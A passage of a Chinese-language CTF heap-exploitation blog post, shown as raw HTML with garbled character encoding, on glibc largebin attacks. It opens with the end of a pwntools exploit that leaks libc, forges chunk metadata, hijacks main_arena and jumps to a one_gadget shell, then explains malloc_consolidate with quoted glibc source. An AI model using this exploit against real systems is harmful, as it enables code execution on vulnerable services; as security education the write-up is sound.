æˆ0x410ï¼Œputsçš„æ—¶å€™æ‰“å°å‡ºäº†æ­£å¸¸çš„ä¸‹ä¸€chunkçš„main_arena+200</span></span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br><span class="line"></span><br><span class="line">junk = flat(</span><br><span class="line">    <span class="string">'\x03'</span>*<span class="number">0x30</span>,        <span class="comment"># å¡«å……åˆ°ä¹‹å‰ç”±äºé˜²æ­¢00æˆªæ–­è€Œè¢«æˆ‘ä»¬åŠ«æŒçš„size</span></span><br><span class="line">    p64(<span class="number">0x81</span>),          <span class="comment"># æ¢å¤0x81çš„size</span></span><br><span class="line">    p64(LIBC+<span class="number">0x3c4be8</span>), <span class="comment"># main_arena+200ï¼Œæ¢å¤smallbinçš„fdæŒ‡é’ˆ</span></span><br><span class="line">    p64(HEAP+<span class="number">0x300</span>),    <span class="comment"># æ¢å¤smallbinä¸­chunkçš„bkæŒ‡é’ˆ</span></span><br><span class="line">)</span><br><span class="line">junk = junk.ljust(<span class="number">0xa8</span>,<span class="string">'A'</span>)</span><br><span class="line">junk += p64(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x80</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x60</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">dele(<span class="number">0x4</span>)</span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># # æ¢å¤chunkç»“æ„</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x70</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x0</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">recovery += p64(<span class="number">0x61</span>)</span><br><span class="line">recovery += p64(LIBC+<span class="number">0x3c4b50</span>)<span class="comment"># åŠ«æŒå¤„äºfastbinä¸­çš„chunkçš„fdæŒ‡é’ˆæŒ‡å‘main_arena</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) </span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  p64(LIBC+<span class="number">0x3c5c50</span>)) <span class="comment"># ç”³è¯·åˆ°main_arena,åŠ«æŒunsortedbinä¸­çš„top chunkæŒ‡å‘main arena</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(HEAP+<span class="number">0x7e0</span>))</span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(LIBC+<span class="number">0x4527a</span>)) <span class="comment"># </span></span><br><span class="line">pause()</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="ç•ªå¤–ç¯‡â€”â€”å…³äºfastbinçš„åˆå¹¶"><a href="#ç•ªå¤–ç¯‡â€”â€”å…³äºfastbinçš„åˆå¹¶" class="headerlink" title="ç•ªå¤–ç¯‡â€”â€”å…³äºfastbinçš„åˆå¹¶"></a>ç•ªå¤–ç¯‡â€”â€”å…³äºfastbinçš„åˆå¹¶</h1><h2 id="åˆå¹¶æ—¶æœº"><a href="#åˆå¹¶æ—¶æœº" class="headerlink" title="åˆå¹¶æ—¶æœº"></a>åˆå¹¶æ—¶æœº</h2><h3 id="åœ¨ç”³è¯·large-chunkæ—¶"><a href="#åœ¨ç”³è¯·large-chunkæ—¶" class="headerlink" title="åœ¨ç”³è¯·large chunkæ—¶"></a>åœ¨ç”³è¯·large chunkæ—¶</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))		<span class="comment">//åˆ¤æ–­è¦ç”³è¯·çš„æ˜¯å¦åœ¨smallbinèŒƒå›´</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">              &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">              &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>			<span class="comment">//ä¸åœ¨smallbinè€Œåœ¨largebinèŒƒå›´æ—¶</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);<span class="comment">//åˆå¹¶</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€èˆ¬ç»“æŸåä¼šæ”¾åˆ°smallbinä¸­</p>
<h3 id="å½“ç”³è¯·çš„chunkéœ€è¦ç”³è¯·æ–°çš„top-chunkæ—¶"><a href="#å½“ç”³è¯·çš„chunkéœ€è¦ç”³è¯·æ–°çš„top-chunkæ—¶" class="headerlink" title="å½“ç”³è¯·çš„chunkéœ€è¦ç”³è¯·æ–°çš„top chunkæ—¶"></a>å½“ç”³è¯·çš„chunkéœ€è¦ç”³è¯·æ–°çš„top chunkæ—¶</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"> </span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      <span class="built_in">size</span> = chunksize (victim);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))	<span class="comment">//top chunkæ˜¯å¦æ»¡è¶³æˆ‘ä»¬ä¸‹ä¸€æ¬¡åˆ†é…çš„éœ€æ±‚ï¼Ÿ</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"> </span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))<span class="comment">//åˆ¤æ–­æ˜¯å¦æœ‰fastbinçš„å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨fastbinï¼Œé‚£ä¹ˆåˆ™è¿›è¡Œåˆå¹¶</span></span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))<span class="comment">//åŒ¹é…æˆ‘ä»¬éœ€è¦çš„å¤§å°nbåœ¨smallbinä¸­æˆ–è€…largebinä¸­æ˜¯å¦æœ‰å¯¹åº”çš„</span></span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span><span class="comment">//å¦‚æœéƒ½ä¸åŒ¹é…orä¸å­˜åœ¨ fastbinï¼Œåˆ™æ‰©å±•top chunkã€‚</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h3 id="freeçš„å †å—å¤§å°å¤§äºfastbinä¸­çš„æœ€å¤§sizeã€‚ï¼ˆæ³¨æ„è¿™é‡Œå¹¶ä¸æ˜¯æŒ‡å½“å‰fastbinä¸­æœ€å¤§chunkçš„sizeï¼Œè€Œæ˜¯æŒ‡fastbinä¸­æ‰€å®šä¹‰çš„æœ€å¤§chunkçš„sizeï¼Œæ˜¯ä¸€ä¸ªå›ºå®šå€¼ã€‚ï¼‰"><a href="#freeçš„å †å—å¤§å°å¤§äºfastbinä¸­çš„æœ€å¤§sizeã€‚ï¼ˆæ³¨æ„è¿™é‡Œå¹¶ä¸æ˜¯æŒ‡å½“å‰fastbinä¸­æœ€å¤§chunkçš„sizeï¼Œè€Œæ˜¯æŒ‡fastbinä¸­æ‰€å®šä¹‰çš„æœ€å¤§chunkçš„sizeï¼Œæ˜¯ä¸€ä¸ªå›ºå®šå€¼ã€‚ï¼‰" class="headerlink" title="freeçš„å †å—å¤§å°å¤§äºfastbinä¸­çš„æœ€å¤§sizeã€‚ï¼ˆæ³¨æ„è¿™é‡Œå¹¶ä¸æ˜¯æŒ‡å½“å‰fastbinä¸­æœ€å¤§chunkçš„sizeï¼Œè€Œæ˜¯æŒ‡fastbinä¸­æ‰€å®šä¹‰çš„æœ€å¤§chunkçš„sizeï¼Œæ˜¯ä¸€ä¸ªå›ºå®šå€¼ã€‚ï¼‰"></a>freeçš„å †å—å¤§å°å¤§äºfastbinä¸­çš„æœ€å¤§sizeã€‚ï¼ˆæ³¨æ„è¿™é‡Œå¹¶ä¸æ˜¯æŒ‡å½“å‰fastbinä¸­æœ€å¤§chunkçš„sizeï¼Œè€Œæ˜¯æŒ‡fastbinä¸­æ‰€å®šä¹‰çš„æœ€å¤§chunkçš„sizeï¼Œæ˜¯ä¸€ä¸ªå›ºå®šå€¼ã€‚ï¼‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(<span class="built_in">size</span>) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">  <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br></pre></td></tr></table></figure>

<h2 id="åˆå¹¶è¿‡ç¨‹"><a href="#åˆå¹¶è¿‡ç¨‹" class="headerlink" title="åˆå¹¶è¿‡ç¨‹"></a>åˆå¹¶è¿‡ç¨‹</h2><h3 id="malloc-consolidateæ—¢å¯ä»¥ä½œä¸ºfastbinçš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºfastbinçš„åˆå¹¶å‡½æ•°ã€‚"><a href="#malloc-consolidateæ—¢å¯ä»¥ä½œä¸ºfastbinçš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºfastbinçš„åˆå¹¶å‡½æ•°ã€‚" class="headerlink" title="malloc_consolidateæ—¢å¯ä»¥ä½œä¸ºfastbinçš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºfastbinçš„åˆå¹¶å‡½æ•°ã€‚"></a>malloc_consolidateæ—¢å¯ä»¥ä½œä¸ºfastbinçš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºfastbinçš„åˆå¹¶å‡½æ•°ã€‚</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T <span class="built_in">size</span>;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn't</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;	<span class="comment">//max_fastä¸ºfastbinçš„æœ€å¤§å¤§å°</span></span><br><span class="line">    (av);</span><br><span class="line"> </span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"> </span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;		<span class="comment">//è¿™æ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œå¾ªç¯éå†fastbinä¸­çš„chunk</span></span><br><span class="line">      check_inuse_chunk(av, p);</span><br><span class="line">      nextp = p-&gt;fd;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">      <span class="built_in">size</span> = p-&gt;<span class="built_in">size</span> &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">      nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);</span><br><span class="line">      nextsize = chunksize(nextchunk);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (!prev_inuse(p)) &#123;	<span class="comment">//å½“pre in useä½ä¸º0ï¼Œå³ç‰©ç†ç›¸é‚»çš„ä¸Šä¸€å—æ˜¯freeçŠ¶æ€ï¼Œåˆå¹¶</span></span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        <span class="built_in">size</span> += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkä¸ºfreeçŠ¶æ€ï¼Œåˆå¹¶</span></span><br><span class="line">          <span class="built_in">size</span> += nextsize;</span><br><span class="line">          unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">        unsorted_bin-&gt;fd = p;</span><br><span class="line">        first_unsorted-&gt;bk = p;<span class="comment">//ç›´æ¥æ’å…¥unsortedbinçš„å¤´éƒ¨</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (<span class="built_in">size</span>)) &#123;</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">        p-&gt;bk = unsorted_bin;</span><br><span class="line">        p-&gt;fd = first_unsorted;</span><br><span class="line">        set_foot(p, <span class="built_in">size</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">size</span> += nextsize;</span><br><span class="line">        set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">    &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1ã€é¦–å…ˆå°†ä¸è¯¥å—ç›¸é‚»çš„ä¸‹ä¸€å—çš„PREV_INUSEç½®ä¸º1ã€‚<br>2ã€å¦‚æœç›¸é‚»çš„ä¸Šä¸€å—ä¸ºfreeï¼Œåˆ™åˆå¹¶ï¼Œå†åˆ¤æ–­ç›¸é‚»çš„ä¸‹ä¸€å—æ˜¯å¦freeï¼Œè‹¥freeï¼Œåˆ™åˆå¹¶ã€‚<br>3ã€<strong>ä¸ç®¡æ˜¯å¦å®Œæˆåˆå¹¶ï¼Œéƒ½ä¼šæŠŠfastbinæˆ–è€…å®Œæˆåˆå¹¶ä»¥åçš„binæ”¾åˆ°unsortbinä¸­ã€‚</strong>ï¼ˆå¦‚æœä¸top chunkç›¸é‚»ï¼Œåˆ™åˆå¹¶åˆ°top chunkä¸­ï¼‰è¿™ç‚¹å°¤å…¶è¦æ³¨æ„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¯ä»¥æ³„æ¼å‡ºlibcåŸºåœ°å€çš„åŸå› ã€‚<strong>ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œä»£è¡¨ï¼Œå³ä½¿æ²¡æœ‰å‘ç”Ÿåˆå¹¶ï¼Œä¹Ÿä¼šå°†å¯¹åº”çš„fastbinçš„chunkæ”¾å…¥unosrtedbinï¼Œæ¯”å¦‚æˆ‘ä»¬æœ‰ä¸€ä¸ª0x60ã€ä¸€ä¸ª0x80ã€ä»–ä»¬ç‰©ç†ä¸Šä¸ç›¸é‚»ï¼Œä½†éƒ½å¤„äºfreeçŠ¶æ€ï¼Œé‚£ä¹ˆåˆå¹¶æ—¶ä»–ä»¬ä¿©éƒ½ä¼šè¢«æ”¾å…¥unsortedbinã€‚ï¼‰</strong></p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.jianshu.com/p/d3fdeff8683f" target="_blank" rel="noopener">https://www.jianshu.com/p/d3fdeff8683f</a></p>
<p><a href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/#large-bin" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/heap_implementation_details/#large-bin</a></p>
<p><a href="https://xz.aliyun.com/t/5177?accounttraceid=a5c0b873d40e445f90a2b0a7e8cde4a4fkam" target="_blank" rel="noopener">https://xz.aliyun.com/t/5177?accounttraceid=a5c0b873d40e445f90a2b0a7e8cde4a4fkam</a></p>
<p><a href="https://bbs.pediy.com/thread-257742.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257742.htm</a></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Paxos</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/">http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/largebin/">largebin</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2020/08/14/di8hDO.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="å¾®ä¿¡"/><div class="post-qr-code__desc">å¾®ä¿¡</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="æ”¯ä»˜å¯¶"/><div 